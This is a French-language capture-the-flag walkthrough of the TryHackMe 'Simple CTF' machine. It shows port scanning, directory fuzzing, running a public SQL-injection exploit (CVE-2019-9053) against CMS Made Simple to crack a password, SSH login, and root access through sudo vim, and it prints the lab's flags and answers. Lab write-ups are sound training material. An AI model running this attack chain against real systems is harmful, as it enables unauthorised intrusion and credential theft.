# Simple CTF #

***

Nous allons faire un scan la machine avec nmap

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nmap -A 10.10.63.136
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 13:45 CEST
Nmap scan report for 10.10.63.136
Host is up (0.038s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.228.66
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.93 seconds
```

Nous allons répondre à quelques questions à partir des résultats.

**How many services are running under port 1000?**

Ici on voit 2 services qui fonctionne.
réponse : 2

**What is running on the higher port?**
Le plus haut port est le 2222, qui est le service SSH.
réponse : ssh

***

**What's the CVE you're using against the application?**  
A partir de scan de nmap ou voit qu'il a le service http sur le port 80 qui est ouvert.
Faisons un fuzzing avec gobuster pour voir si il y a pas de liens qui existes.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://10.10.63.136 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.63.136
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/14 14:09:45 Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 313] [--> http://10.10.63.136/simple/]
/server-status        (Status: 403) [Size: 300]                                  
Progress: 115990 / 220561 (52.59%)                                              ^C
[!] Keyboard interrupt detected, terminating.
                                                                                 
===============================================================
2021/07/14 14:17:19 Finished
===============================================================
```

On voit qu'un lien vers /simples/ existe examinons le.  

```bash
#                                                                                                                                                                                                                 Home - Pentest it (p3 sur 3)
          + Top simple navigation + left subnavigation + 1 column
          + CSSMenu top + 2 columns
          + CSSMenu left + 1 column
          + Minimal template
          + Higher End
     * Default Extensions
          + Modules
          + Tags

     * Twitter
     * Facebook
     * LinkedIn
     * YouTube
     * Google Plus
     * Pinterest

   © Copyright 2004 - 2021 - CMS Made Simple
   This site is powered by CMS Made Simple version 2.2.8
```

A la fin du site web on voit que le nom de CMS est CMS Made Simple version 2.2.8

***

Faisons une recherche.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ searchsploit CMS Made simple 2.2.8
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                                                                    | php/webapps/46635.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

tim@kali:~/Bureau/tryhackme/write-up$ cat /usr/share/exploitdb/exploits/php/webapps/46635.py | grep CVE
# CVE : CVE-2019-9053
```

Ici on voit que c'est le CVE-2019-9053.

Notre réponse est : CVE-2019-9053

***

**To what kind of vulnerability is the application vulnerable?**
```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat /usr/share/exploitdb/exploits/php/webapps/46635.py | head
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053
```

On voit ici c'est une SQL Injection, autrement dit sqli.
La réponse est : sqli

***

**What's the password?**
```bash
tim@kali:~/Bureau/tryhackme/write-up$ cp  /usr/share/exploitdb/exploits/php/webapps/46635.py .
tim@kali:~/Bureau/tryhackme/write-up$ cat /usr/share/wordlists/rockyou.txt | grep  ^......$ > 6lettres.txt
tim@kali:~/Bureau/tryhackme/write-up$ python 46635.py -u http://10.10.31.41/simple/ --crack -w ./6lettres.txt
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```
J'utilise un exploit avec les mots de longueur de 6 lettres car c'est sinon c'est long, je connais la longueur de mot de passe grasse au nombre d'astérisque dans la question.  

Ici le mot de passe est : secret 

***

**Where can you login with the details obtained?**

Dans le scan nmap au port 2222 on voit le service SSH.
```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh mitch@10.10.31.41 -p 2222
The authenticity of host '[10.10.31.41]:2222 ([10.10.31.41]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.31.41]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.31.41's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ 
```

***

**What's the user flag?**
```bash
$ pwd
/home/mitch
$ cat user.txt
G00d j0b, keep up!
```

La réponse est : G00d j0b, keep up!  

***

**Is there any other user in the home directory? What's its name?**
```bash
$ cd ..
$ ls
mitch  sunbath
$ 
```

Ici on voit que l'autre utilisateur : sunbath

***

**What can you leverage to spawn a privileged shell?**

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
``` 

On voit que pour l'utilisateur mitch la commande sudo ne demande aucun mot de passe pour /usr/bin/vim 

Réponse : vim

***

**What's the root flag?**

On utilise vim pour lire le dernier flag.

```bash
sudo /usr/bin/vim /root/root.txt
W3ll d0n3. You made it!
```
La réponse est : W3ll d0n3. You made it!  